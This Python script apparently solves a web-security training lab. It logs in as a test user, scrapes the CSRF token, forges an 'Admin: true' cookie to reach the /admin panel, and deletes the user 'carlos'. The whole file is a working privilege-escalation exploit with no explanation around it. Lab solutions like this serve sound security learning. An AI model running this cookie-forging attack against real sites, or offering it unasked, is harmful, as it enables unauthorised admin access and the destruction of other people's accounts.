import requests
from bs4 import BeautifulSoup

target_URL = "YOUR_URL"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br"
}


session = requests.Session()
session.headers.update(headers)

get_login = session.get(target_URL + "/login")
soup = BeautifulSoup(get_login.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]
print("[*] CSRF Token:", csrf)

post_login = session.post(
    target_URL + "/login",
    data={"csrf": csrf, "username": "wiener", "password": "peter"},
    allow_redirects=True
)

if post_login.status_code == 200 or "Log out" in post_login.text:
    print("[+] Login successfully")
else:
    print("[-] Login failed")

admin_cookies = {"Admin": "true"}

get_admin = session.get(target_URL + "/admin", cookies=admin_cookies)
if get_admin.status_code == 200:
    print("[+] Access to admin panel successfully")
else:
    print("[-] Access to admin panel failed")
    
del_user = session.get(target_URL + "/admin/delete?username=carlos", cookies=admin_cookies)
if del_user.status_code == 200:
    print("[+] Delete user successfully")
else:
    print("[-] Delete user failed")